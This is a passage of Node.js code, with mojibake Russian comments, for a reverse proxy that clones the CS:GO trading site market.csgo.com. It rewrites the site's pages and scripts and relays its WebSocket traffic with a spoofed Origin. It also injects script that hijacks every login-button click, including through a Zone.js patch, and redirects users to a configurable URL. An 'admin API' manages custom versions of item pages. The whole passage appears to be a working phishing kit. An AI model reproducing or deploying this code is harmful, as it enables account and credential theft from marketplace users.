                            }, 150); // –ó–∞–¥–µ—Ä–∂–∫–∞ —á—Ç–æ–±—ã –±—ã–ª –≤–∏–¥–µ–Ω ripple-—ç—Ñ—Ñ–µ–∫—Ç
                            
                            return false;
                        }, true);
                    });
                }
            });
        });
    }
    
    // –ì–ª–æ–±–∞–ª—å–Ω—ã–π –ø–µ—Ä–µ—Ö–≤–∞—Ç –¥–ª—è –Ω–æ–≤—ã—Ö/–Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã—Ö —ç–ª–µ–º–µ–Ω—Ç–æ–≤
    function setupGlobalCapture() {
        // –ü–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º –≤—Å–µ –∫–ª–∏–∫–∏ –Ω–∞ —É—Ä–æ–≤–Ω–µ –¥–æ–∫—É–º–µ–Ω—Ç–∞
        document.addEventListener('click', function(e) {
            let target = e.target;
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –±—ã–ª –ª–∏ –∫–ª–∏–∫ –Ω–∞ –∏–ª–∏ –≤–Ω—É—Ç—Ä–∏ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏—Ö –Ω–∞—Å –∫–Ω–æ–ø–æ–∫
            while (target && target !== document) {
                for (const selector of targetSelectors) {
                    if (target.matches && 
                        (target.matches(selector) || target.closest(selector))) {
                        
                        console.log('–ì–ª–æ–±–∞–ª—å–Ω–æ –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω –∫–ª–∏–∫ –ø–æ –∫–Ω–æ–ø–∫–µ –≤—Ö–æ–¥–∞');
                        e.preventDefault();
                        e.stopPropagation();
                        
                        // –†–µ–¥–∏—Ä–µ–∫—Ç
                        window.location.href = targetUrl;
                        return false;
                    }
                }
                target = target.parentElement;
            }
        }, true); // Phase=true –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –≤ –ø–µ—Ä–≤—É—é –æ—á–µ—Ä–µ–¥—å
        
        // –¢–∞–∫–∂–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º mousedown –¥–ª—è Angular Material
        document.addEventListener('mousedown', function(e) {
            let target = e.target;
            
            while (target && target !== document) {
                for (const selector of targetSelectors) {
                    // –ï—Å–ª–∏ —ç—Ç–æ –∫–Ω–æ–ø–∫–∞ –≤—Ö–æ–¥–∞ –∏–ª–∏ –µ—ë –ø–æ—Ç–æ–º–æ–∫
                    if (target.matches && 
                        (target.matches(selector) || target.closest(selector))) {
                        
                        console.log('–ì–ª–æ–±–∞–ª—å–Ω–æ –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω mousedown –Ω–∞ –∫–Ω–æ–ø–∫–µ –≤—Ö–æ–¥–∞');
                        
                        // –î–ª—è ripple —ç—Ñ—Ñ–µ–∫—Ç–∞: –ø—É—Å—Ç—å –Ω–µ–º–Ω–æ–≥–æ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç, –Ω–æ –ø–æ—Ç–æ–º —Ä–µ–¥–∏—Ä–µ–∫—Ç
                        setTimeout(() => {
                            window.location.href = targetUrl;
                        }, 150);
                        
                        return; // –ü–æ–∑–≤–æ–ª—è–µ–º —Å–æ–±—ã—Ç–∏—é –ø—Ä–æ–π—Ç–∏ –¥–ª—è –≤–∏–∑—É–∞–ª—å–Ω–æ–≥–æ —ç—Ñ—Ñ–µ–∫—Ç–∞
                    }
                }
                target = target.parentElement;
            }
        }, true);
    }
    
    // –ü–∞—Ç—á–∏–º Angular Zone.js (–µ—Å–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è)
    function patchAngularZone() {
        if (window.Zone && window.Zone.__symbol__) {
            try {
                console.log('–û–±–Ω–∞—Ä—É–∂–µ–Ω Angular Zone.js, —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø–∞—Ç—á');
                
                // –ü–æ–ª—É—á–∞–µ–º —Å–∏–º–≤–æ–ª—ã Zone.js
                const ADD_EVENT_LISTENER = Zone.__symbol__('addEventListener');
                
                // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ document[ADD_EVENT_LISTENER]
                if (document[ADD_EVENT_LISTENER]) {
                    const originalZoneAEL = HTMLElement.prototype[ADD_EVENT_LISTENER];
                    
                    // –ü–µ—Ä–µ–æ–ø—Ä–µ–¥–µ–ª—è–µ–º –º–µ—Ç–æ–¥
                    HTMLElement.prototype[ADD_EVENT_LISTENER] = function(eventName, handler, useCapture) {
                        // –ï—Å–ª–∏ —ç—Ç–æ –∫–Ω–æ–ø–∫–∞ –ª–æ–≥–∏–Ω–∞
                        if (targetSelectors.some(sel => 
                            this.matches && (this.matches(sel) || this.closest(sel)))) {
                            
                            // –î–ª—è —Å–æ–±—ã—Ç–∏–π –∫–ª–∏–∫–∞ 
                            if (eventName === 'click' || eventName === 'mousedown') {
                                console.log('–ü–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–æ Zone.js —Å–æ–±—ã—Ç–∏–µ', eventName);
                                
                                // –ó–∞–º–µ–Ω—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫
                                return originalZoneAEL.call(this, eventName, function(e) {
                                    // –†–∞–∑—Ä–µ—à–∞–µ–º –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —ç—Ñ—Ñ–µ–∫—Ç—ã –¥–ª—è mousedown (ripple)
                                    if (eventName === 'mousedown') {
                                        setTimeout(() => {
                                            window.location.href = targetUrl;
                                        }, 150);
                                        return;
                                    }
                                    
                                    // –î–ª—è click —Å—Ä–∞–∑—É –±–ª–æ–∫–∏—Ä—É–µ–º –∏ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∏–º
                                    e.preventDefault();
                                    e.stopPropagation();
                                    window.location.href = targetUrl;
                                    return false;
                                }, true);
                            }
                        }
                        
                        // –î–ª—è –¥—Ä—É–≥–∏—Ö —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –∏—Å–ø–æ–ª—å–∑—É–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –º–µ—Ç–æ–¥
                        return originalZoneAEL.call(this, eventName, handler, useCapture);
                    };
                }
            } catch (e) {
                console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–∞—Ç—á–µ Angular Zone.js:', e);
            }
        }
    }
    
    // –ó–∞–ø—É—Å–∫–∞–µ–º –ø–µ—Ä–µ—Ö–≤–∞—Ç —Å—Ä–∞–∑—É
    enhanceLoginButtons();
    
    // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –≥–ª–æ–±–∞–ª—å–Ω—ã–π –ø–µ—Ä–µ—Ö–≤–∞—Ç
    setupGlobalCapture();
    
    // –ü—Ä–æ–±—É–µ–º –ø–∞—Ç—á–∏—Ç—å Angular Zone.js —Å –∑–∞–¥–µ—Ä–∂–∫–æ–π
    setTimeout(patchAngularZone, 500);
    
    // –¢–∞–∫–∂–µ –ø—Ä–æ–≤–µ—Ä—è–µ–º –ø–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏ –¥–ª—è –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –¥–æ–±–∞–≤–ª—è–µ–º—ã—Ö –∫–Ω–æ–ø–æ–∫
    setInterval(enhanceLoginButtons, 1000);
    
    // –ò—Å–ø–æ–ª—å–∑—É–µ–º MutationObserver –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è DOM –∏–∑–º–µ–Ω–µ–Ω–∏–π
    const observer = new MutationObserver(mutations => {
        enhanceLoginButtons();
    });
    
    // –ù–∞–±–ª—é–¥–∞–µ–º –∑–∞ –≤—Å–µ–º –¥–æ–∫—É–º–µ–Ω—Ç–æ–º
    observer.observe(document.documentElement, {
        childList: true,
        subtree: true
    });
    
    console.log('‚úÖ –ü–µ—Ä–µ—Ö–≤–∞—Ç –∫–Ω–æ–ø–æ–∫ –≤—Ö–æ–¥–∞ —Å —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ–º —Å—Ç–∏–ª–µ–π —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω');
})();
</script>
        `;
        
        modified = modified.replace(/<head[^>]*>/i, `$&${proxyScript}`);
        modified = modified.replace('</body>', loginButtonsScript + '</body>');
    }
    
    // –°–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã–µ –∑–∞–º–µ–Ω—ã –¥–ª—è JavaScript
    if (contentType.includes('javascript')) {
        modified = modified.replace(/"\/api\//g, `"${baseUrl}/api/`);
        modified = modified.replace(/'\/api\//g, `'${baseUrl}/api/`);
        
        // –ö–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è –∑–∞–º–µ–Ω–∞ WebSocket URLs –≤ JavaScript
        modified = modified.replace(/centrifugo2\.csgotrader\.app/g, 
            hostWithoutProtocol + '/ws');
            
        // –£–ª—É—á—à–µ–Ω–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∞ GraphQL URLs
        modified = modified.replace(/['"]https:\/\/market\.csgo\.com\/api\/graphql['"]/g, 
            `'${baseUrl}/api/graphql'`);
            
        // –ò–°–ü–†–ê–í–õ–ï–ù–û: –î–æ–±–∞–≤–ª–µ–Ω–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∞ GQL –æ—à–∏–±–æ–∫
        if (modified.includes('GQL fail') || modified.includes('viewItem')) {
            modified = modified.replace(/console\.error\(['"]GQL fail/g, 
                'console.warn("GQL fail handled:" + ');
                
            // –û–±–æ—Ä–∞—á–∏–≤–∞–µ–º –≤—ã–∑–æ–≤—ã viewItem –≤ try/catch
            modified = modified.replace(
                /return(\s+)viewItem\(/g, 
                'try { return$1viewItem('
            );
            modified = modified.replace(
                /viewItem\(([^)]*)\);/g, 
                'viewItem($1).catch(err => console.warn("Handled viewItem error:", err));'
            );
        }
        
        // –ò–°–ü–†–ê–í–õ–ï–ù–û: –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –¥–ª—è chunk-FWBJZS6X.js:2957
        if (modified.includes('chunk-FWBJZS6X.js') || modified.includes('[chunk-FWBJZS6X.js:3012:33350]')) {
            console.log('Applying fixes for problematic chunk-FWBJZS6X.js');
            
            // –ü—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ–º –ø–∞–¥–µ–Ω–∏–µ –ø—Ä–∏ –æ—à–∏–±–∫–∞—Ö
            modified = modified.replace(
                /throw new Error\(['"]GQL fail/g,
                'console.warn("Handled GQL error:"'
            );
            
            // –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç–∫—É –æ—à–∏–±–æ–∫ –¥–ª—è ajax/fetch –∑–∞–ø—Ä–æ—Å–æ–≤
            modified = modified.replace(
                /(\.then\()function\s*\(\s*([a-zA-Z0-9_]+)\s*\)\s*{/g,
                '$1function($2) { try {'
            );
            
            modified = modified.replace(
                /}\)\.catch\(/g,
                '} catch(err) { console.warn("Handled error in then:", err); } })\.catch('
            );
        }
    }
    
    // –°–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã–µ –∑–∞–º–µ–Ω—ã –¥–ª—è CSS
    if (contentType.includes('css')) {
        modified = modified.replace(/url\(['"]?\//g, `url('${baseUrl}/`);
        modified = modified.replace(/url\(['"]?http:\/\//g, `url('${baseUrl.replace('https:', 'http:')}/`);
    }
    
    return modified;
}

// –ò–°–ü–†–ê–í–õ–ï–ù–û: –£–ª—É—á—à–µ–Ω–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ WebSocket –ø—Ä–æ–∫—Å–∏ —Å –ø–æ–≤—Ç–æ—Ä–Ω—ã–º–∏ –ø–æ–ø—ã—Ç–∫–∞–º–∏
const wsProxy = new WebSocket.Server({ 
    noServer: true,
    clientTracking: true,
    perMessageDeflate: true
});

// –ö–∞—Ä—Ç–∞ –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π
const activeWSConnections = new Map();

server.on('upgrade', (request, socket, head) => {
    const pathname = url.parse(request.url).pathname;
    
    // –£–ª—É—á—à–µ–Ω–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∞ WebSocket –ø—É—Ç–µ–π
    if (pathname === '/ws' || pathname.startsWith('/ws/') || pathname.includes('connection/websocket')) {
        wsProxy.handleUpgrade(request, socket, head, (ws) => {
            handleWebSocketProxy(ws, request);
        });
    } else {
        socket.destroy();
    }
});

// –ò–°–ü–†–ê–í–õ–ï–ù–û: –£–ª—É—á—à–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ WebSocket —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π —Å –ø–æ–≤—Ç–æ—Ä–Ω—ã–º–∏ –ø–æ–ø—ã—Ç–∫–∞–º–∏
function handleWebSocketProxy(clientWs, request) {
    try {
        // –ö–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –ø–æ—Å—Ç—Ä–æ–µ–Ω–∏–µ —Ü–µ–ª–µ–≤–æ–≥–æ URL
        let wsPath = request.url.replace('/ws', '');
        if (!wsPath.includes('connection/websocket')) {
            wsPath += '/connection/websocket';
        }
        
        const targetUrl = WS_TARGET + wsPath;
        console.log('WebSocket proxy:', targetUrl);
        
        // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID –¥–ª—è —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
        const connectionId = Math.random().toString(36).substring(2, 15);
        
        // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–∏
        activeWSConnections.set(connectionId, {
            clientWs,
            targetWs: null,
            url: targetUrl,
            connected: false,
            retryCount: 0,
            lastActivity: Date.now(),
            buffer: [] // –ë—É—Ñ–µ—Ä –¥–ª—è —Å–æ–æ–±—â–µ–Ω–∏–π –¥–æ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
        });
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ —Ü–µ–ª–µ–≤–æ–º—É WebSocket —Å –ø–æ–≤—Ç–æ—Ä–Ω—ã–º–∏ –ø–æ–ø—ã—Ç–∫–∞–º–∏
        function connectToTarget(retryCount = 0) {
            const MAX_RETRIES = 5;
            const RETRY_DELAY = 2000 * Math.pow(1.5, retryCount);
            
            if (retryCount >= MAX_RETRIES) {
                console.error(`WebSocket connection failed after ${MAX_RETRIES} attempts`);
                clientWs.close(1011, `Failed to connect after ${MAX_RETRIES} attempts`);
                activeWSConnections.delete(connectionId);
                return;
            }
            
            console.log(`Attempting WebSocket connection (attempt ${retryCount + 1}): ${targetUrl}`);
            
            // –î–æ–±–∞–≤–ª–µ–Ω—ã –±–æ–ª–µ–µ –Ω–∞–¥–µ–∂–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –¥–ª—è WebSocket —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
            const targetWs = new WebSocket(targetUrl, {
                headers: {
                    'Origin': 'https://market.csgo.com',
                    'User-Agent': request.headers['user-agent'] || 'Mozilla/5.0',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Pragma': 'no-cache',
                    'Cache-Control': 'no-cache',
                    'Sec-WebSocket-Protocol': request.headers['sec-websocket-protocol'] || '',
                    'Sec-WebSocket-Extensions': request.headers['sec-websocket-extensions'] || '',
                    ...request.headers
                },
                followRedirects: true,
                handshakeTimeout: 15000
            });
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ü–µ–ª–µ–≤–æ–π WebSocket –≤ Map
            const connectionInfo = activeWSConnections.get(connectionId);
            if (connectionInfo) {
                connectionInfo.targetWs = targetWs;
                connectionInfo.retryCount = retryCount;
            }
            
            // –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
            targetWs.on('open', () => {
                console.log(`Target WebSocket connected successfully (${connectionId})`);
                
                const connectionInfo = activeWSConnections.get(connectionId);
                if (connectionInfo) {
                    connectionInfo.connected = true;
                    connectionInfo.lastActivity = Date.now();
                    
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –±—É—Ñ–µ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è, –µ—Å–ª–∏ –æ–Ω–∏ –µ—Å—Ç—å
                    if (connectionInfo.buffer.length > 0) {
                        console.log(`Sending ${connectionInfo.buffer.length} buffered messages`);
                        connectionInfo.buffer.forEach(message => {
                            try {
                                targetWs.send(message);
                            } catch (err) {
                                console.error('Error sending buffered message:', err.message);
                            }
                        });
                        connectionInfo.buffer = [];
                    }
                }
            });
            
            // Client -> Server —Å –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –æ—à–∏–±–æ–∫ –∏ –±—É—Ñ–µ—Ä–∏–∑–∞—Ü–∏–µ–π
            clientWs.on('message', (message) => {
                try {
                    const connectionInfo = activeWSConnections.get(connectionId);
                    if (!connectionInfo) return;
                    
                    connectionInfo.lastActivity = Date.now();
                    
                    if (connectionInfo.connected && connectionInfo.targetWs.readyState === WebSocket.OPEN) {
                        connectionInfo.targetWs.send(message);
                    } else {
                        // –ë—É—Ñ–µ—Ä–∏–∑—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏—è, –µ—Å–ª–∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –µ—â–µ –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ
                        console.log(`Buffering message for later delivery (${connectionId})`);
                        connectionInfo.buffer.push(message);
                    }
                } catch (err) {
                    console.error('Error sending message to target:', err.message);
                }
            });
            
            // Server -> Client —Å –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –æ—à–∏–±–æ–∫
            targetWs.on('message', (message) => {
                try {
                    const connectionInfo = activeWSConnections.get(connectionId);
                    if (!connectionInfo) return;
                    
                    connectionInfo.lastActivity = Date.now();
                    
                    if (connectionInfo.clientWs.readyState === WebSocket.OPEN) {
                        connectionInfo.clientWs.send(message);
                    }
                } catch (err) {
                    console.error('Error sending message to client:', err.message);
                }
            });
            
            // –û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–∫—Ä—ã—Ç–∏—è —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π
            clientWs.on('close', (code, reason) => {
                console.log(`Client WebSocket closed (${connectionId}): ${code} ${reason}`);
                
                const connectionInfo = activeWSConnections.get(connectionId);
                if (connectionInfo && connectionInfo.targetWs) {
                    if (connectionInfo.targetWs.readyState === WebSocket.OPEN || 
                        connectionInfo.targetWs.readyState === WebSocket.CONNECTING) {
                        connectionInfo.targetWs.close(code, reason);
                    }
                }
                
                activeWSConnections.delete(connectionId);
            });
            
            targetWs.on('close', (code, reason) => {
                console.log(`Target WebSocket closed (${connectionId}): ${code} ${reason}`);
                
                const connectionInfo = activeWSConnections.get(connectionId);
                if (!connectionInfo) return;
                
                // –ï—Å–ª–∏ —ç—Ç–æ –Ω–µ –ø—Ä–µ–¥–Ω–∞–º–µ—Ä–µ–Ω–Ω–æ–µ –∑–∞–∫—Ä—ã—Ç–∏–µ, –ø—ã—Ç–∞–µ–º—Å—è –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è
                if (code !== 1000 && code !== 1001 && 
                    connectionInfo.clientWs.readyState === WebSocket.OPEN) {
                    
                    console.log(`Attempting to reconnect WebSocket (${connectionId})...`);
                    
                    // –£–≤–µ–¥–æ–º–ª—è–µ–º –∫–ª–∏–µ–Ω—Ç–∞ –æ –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
                    try {
                        connectionInfo.clientWs.send(JSON.stringify({
                            type: 'reconnecting',
                            message: 'Connection lost, attempting to reconnect...'
                        }));
                    } catch (e) {
                        // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ
                    }
                    
                    // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å—Ç–∞—Ç—É—Å —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
                    connectionInfo.connected = false;
                    
                    // –ü—ã—Ç–∞–µ–º—Å—è –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è —Å –∑–∞–¥–µ—Ä–∂–∫–æ–π
                    setTimeout(() => {
                        connectToTarget(connectionInfo.retryCount + 1);
                    }, 2000);
                    
                } else if (connectionInfo.clientWs.readyState === WebSocket.OPEN) {
                    // –ï—Å–ª–∏ —ç—Ç–æ –ø—Ä–µ–¥–Ω–∞–º–µ—Ä–µ–Ω–Ω–æ–µ –∑–∞–∫—Ä—ã—Ç–∏–µ, –∑–∞–∫—Ä—ã–≤–∞–µ–º –∫–ª–∏–µ–Ω—Ç—Å–∫–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ
                    connectionInfo.clientWs.close(code, reason);
                    activeWSConnections.delete(connectionId);
                }
            });
            
            // –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π
            clientWs.on('error', (err) => {
                console.error(`Client WebSocket error (${connectionId}):`, err.message);
                
                const connectionInfo = activeWSConnections.get(connectionId);
                if (connectionInfo && connectionInfo.targetWs) {
                    if (connectionInfo.targetWs.readyState === WebSocket.OPEN || 
                        connectionInfo.targetWs.readyState === WebSocket.CONNECTING) {
                        connectionInfo.targetWs.close(1011, 'Client error');
                    }
                }
                
                activeWSConnections.delete(connectionId);
            });
            
            targetWs.on('error', (err) => {
                console.error(`Target WebSocket error (${connectionId}):`, err.message);
                
                const connectionInfo = activeWSConnections.get(connectionId);
                if (!connectionInfo) return;
                
                // –ï—Å–ª–∏ –∫–ª–∏–µ–Ω—Ç –µ—â–µ –ø–æ–¥–∫–ª—é—á–µ–Ω, –ø—ã—Ç–∞–µ–º—Å—è –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ —Å–µ—Ä–≤–µ—Ä—É
                if (connectionInfo.clientWs.readyState === WebSocket.OPEN) {
                    // –£–≤–µ–¥–æ–º–ª—è–µ–º –∫–ª–∏–µ–Ω—Ç–∞ –æ –ø—Ä–æ–±–ª–µ–º–µ
                    try {
                        connectionInfo.clientWs.send(JSON.stringify({
                            type: 'error',
                            message: 'Connection to server failed, attempting to reconnect...'
                        }));
                    } catch (e) {
                        // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ
                    }
                    
                    // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å—Ç–∞—Ç—É—Å —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
                    connectionInfo.connected = false;
                    
                    // –ü—ã—Ç–∞–µ–º—Å—è –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è —Å –∑–∞–¥–µ—Ä–∂–∫–æ–π
                    setTimeout(() => {
                        connectToTarget(connectionInfo.retryCount + 1);
                    }, 2000);
                }
            });
        }
        
        // –ò–Ω–∏—Ü–∏–∏—Ä—É–µ–º –ø–µ—Ä–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
        connectToTarget(0);
        
    } catch (error) {
        console.error('WebSocket proxy setup error:', error.message);
        if (clientWs.readyState === WebSocket.OPEN) {
            clientWs.close(1011, 'WebSocket proxy error');
        }
    }
}

// –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ WebSocket —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π
setInterval(() => {
    const now = Date.now();
    
    for (const [id, connection] of activeWSConnections.entries()) {
        const inactiveTime = now - connection.lastActivity;
        
        // –ï—Å–ª–∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –Ω–µ–∞–∫—Ç–∏–≤–Ω–æ –±–æ–ª–µ–µ 2 –º–∏–Ω—É—Ç, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º ping –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏
        if (inactiveTime > 2 * 60 * 1000) {
            console.log(`WebSocket inactive for ${Math.round(inactiveTime/1000)}s (${id}), sending ping`);
            
            try {
                if (connection.connected && connection.targetWs.readyState === WebSocket.OPEN) {
                    connection.targetWs.ping();
                }
                
                if (connection.clientWs.readyState === WebSocket.OPEN) {
                    connection.clientWs.ping();
                }
                
                // –û–±–Ω–æ–≤–ª—è–µ–º –≤—Ä–µ–º—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏
                connection.lastActivity = now;
            } catch (e) {
                console.warn(`Error sending ping for connection ${id}:`, e.message);
            }
        }
        
        // –ï—Å–ª–∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –Ω–µ–∞–∫—Ç–∏–≤–Ω–æ –±–æ–ª–µ–µ 5 –º–∏–Ω—É—Ç, –∑–∞–∫—Ä—ã–≤–∞–µ–º –µ–≥–æ
        if (inactiveTime > 5 * 60 * 1000) {
            console.log(`Closing inactive WebSocket connection (${id})`);
            
            try {
                if (connection.targetWs && 
                   (connection.targetWs.readyState === WebSocket.OPEN || 
                    connection.targetWs.readyState === WebSocket.CONNECTING)) {
                    connection.targetWs.close(1000, 'Connection timeout');
                }
                
                if (connection.clientWs.readyState === WebSocket.OPEN) {
                    connection.clientWs.close(1000, 'Connection timeout');
                }
            } catch (e) {
                console.warn(`Error closing inactive connection ${id}:`, e.message);
            }
            
            activeWSConnections.delete(id);
        }
    }
}, 60 * 1000); // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞–∂–¥—É—é –º–∏–Ω—É—Ç—É

// –£–õ–£–ß–®–ï–ù–û: –ê–¥–º–∏–Ω API –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–∞—Å—Ç–æ–º–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü —Å –±–æ–ª–µ–µ –Ω–∞–¥–µ–∂–Ω—ã–º –º–∞—Ç—á–∏–Ω–≥–æ–º URL
app.get('/admin-api/check-custom-page', (req, res) => {
    const urlToCheck = req.query.url;
    
    if (!urlToCheck) {
        return res.status(400).json({ error: 'URL parameter is required' });
    }
    
    // –î–µ–∫–æ–¥–∏—Ä—É–µ–º URL –¥–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–≥–æ —Å—Ä–∞–≤–Ω–µ–Ω–∏—è
    const decodedUrl = decodeURIComponent(urlToCheck);
    
    // –£–ª—É—á—à–µ–Ω–Ω–æ–µ —Å–æ–ø–æ—Å—Ç–∞–≤–ª–µ–Ω–∏–µ URL —Å —É—á–µ—Ç–æ–º –≤–æ–∑–º–æ–∂–Ω—ã—Ö —à–∞–±–ª–æ–Ω–æ–≤ (wildcards)
    let hasCustomizations = false;
    let matchedUrl = null;
    
    for (const [pageUrl, config] of customPages.entries()) {
        // –¢–æ—á–Ω–æ–µ —Å–æ–≤–ø–∞–¥–µ–Ω–∏–µ
        if (pageUrl === decodedUrl || pageUrl === urlToCheck) {
            hasCustomizations = true;
            matchedUrl = pageUrl;
            break;
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —à–∞–±–ª–æ–Ω —Å–æ –∑–≤–µ–∑–¥–æ—á–∫–æ–π
        if (pageUrl.includes('*')) {
            const escapeRegExp = (string) => string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            const pattern = escapeRegExp(pageUrl).replace(/\\\*/g, '.*');
            const regex = new RegExp('^' + pattern + '$');
            
            if (regex.test(decodedUrl) || regex.test(urlToCheck)) {
                hasCustomizations = true;
                matchedUrl = pageUrl;
                break;
            }
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ ID —Ç–æ–≤–∞—Ä–∞
        if (decodedUrl.includes('id=') && pageUrl.includes('id=')) {
            const urlIdMatch = /id=([0-9]+)/.exec(decodedUrl);
            const pageUrlIdMatch = /id=([0-9]+)/.exec(pageUrl);
            
            if (urlIdMatch && pageUrlIdMatch && urlIdMatch[1] === pageUrlIdMatch[1]) {
                hasCustomizations = true;
                matchedUrl = pageUrl;
                break;
            }
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ –ø—É—Ç–∏ –±–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
        const urlPath = decodedUrl.split('?')[0];
        const pageUrlPath = pageUrl.split('?')[0];
        
        if (urlPath === pageUrlPath) {
            hasCustomizations = true;
            matchedUrl = pageUrl;
            break;
        }
    }
    
